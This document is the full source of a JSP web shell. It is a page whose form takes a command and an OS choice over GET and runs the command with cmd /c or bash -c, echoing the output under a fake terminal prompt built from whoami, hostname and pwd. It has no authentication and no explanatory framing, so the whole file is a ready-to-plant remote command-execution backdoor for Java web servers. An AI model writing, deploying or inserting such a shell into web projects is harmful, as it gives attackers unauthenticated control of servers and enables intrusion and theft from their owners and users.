<body style="background: rgb(30,30,30);">

<form method="GET" action="index.jsp">
   <h4 style="color: white;">Command Options</h4>

   <select id="osType" name="osType">
      <option value="win">Windows</option>
      <option value="linux">Linux</option>
   </select>

   </br>
   </br>

   <input id="cmd" name="cmd" type=text autofocus style="width: 300px;">
   <input type=submit value="Run Command">
</form>

<%@ page import="java.io.*" %>
<%!
   // Not Perfect, but will be good enough for a majority of cases that will arise
   public String HtmlEncode(String inputVal) {
      return inputVal.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\'", "&apos;").replaceAll("\"", "&quot;");
   }

   public String RunCommand(String commandToRun, String osType) {
      String outputString = "";
      String currentLine = null;

      try {
         ProcessBuilder processBuilder = new ProcessBuilder();

         if (osType.equals("win")) {
            processBuilder.command("cmd", "/c", commandToRun);
         } else {
            processBuilder.command("bash", "-c", commandToRun);
         }
         
         Process p = processBuilder.start();

         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));

         while((currentLine = sI.readLine()) != null) {
            outputString += HtmlEncode(currentLine) + "</br>";
         }
      } catch(IOException e) {
         outputString = "ERROR: </br></br>" + e.getCause() + "</br></br>" + e.getMessage() + "</br>";
      }
      

      return outputString;
   }
%>
<%
   String osType = request.getParameter("osType");
   String cmd = request.getParameter("cmd");
   String output = "";

   String htmlCmd = "";
   String htmlOsType = "";

   if (osType == null || (!osType.equals("win") && !osType.equals("linux"))) {
      osType = "linux";
   }

   if(cmd != null) {
      String line = null;

      String testCommand = RunCommand("", osType);

      if (testCommand.startsWith("ERROR:")) {
         output = RunCommand(cmd, osType);
      } else {
         if (osType.equals("win")) {
            output = "<b style=\"color: white;\">" + HtmlEncode(RunCommand("cd", osType).trim().replaceAll("</br>", "").replaceAll("\r", "").replaceAll("\n", "")) + HtmlEncode("> ") + HtmlEncode(cmd) + "</br></br></b>";
         } else {
            String username = HtmlEncode(RunCommand("whoami", osType).trim().replaceAll("</br>", "").replaceAll("\r", "").replaceAll("\n", ""));
            String hostname = HtmlEncode(RunCommand("hostname", osType).trim().replaceAll("</br>", "").replaceAll("\r", "").replaceAll("\n", ""));
            String workingDir = HtmlEncode(RunCommand("pwd", osType).trim().replaceAll("</br>", "").replaceAll("\r", "").replaceAll("\n", ""));

            String userAndHost = "<b style=\"color: rgb(136,223,51);\">" + username + "@" + hostname + "</b>" + "<span style=\"color: white;\">:</span>";
            String dirPath = "<span style=\"color: rgb(114,159,207);\">" + workingDir + "</span>";

            output = userAndHost + dirPath + "<span style=\"color: white;\"># " + HtmlEncode(cmd) + "</span></br></br>";
         }

         output += RunCommand(cmd, osType);
      }

      htmlCmd = HtmlEncode(cmd);
      htmlOsType = HtmlEncode(osType);
   }
%>
<pre style="color: white;"><%=output %></pre>

<script>
   let cmdValue = "<%=htmlCmd %>".replaceAll("&quot;", "\"").replaceAll("&apos;", "\'").replaceAll("&gt;", ">").replaceAll("&lt;", "<").replaceAll("&amp;", "&");
   let osTypeValue = "<%=htmlOsType %>";
   
   if (osTypeValue !== 'win' && osTypeValue !== 'linux') osTypeValue = 'linux';

   document.getElementById('cmd').value = cmdValue;
   document.getElementById('osType').value = osTypeValue;
</script>

</body>
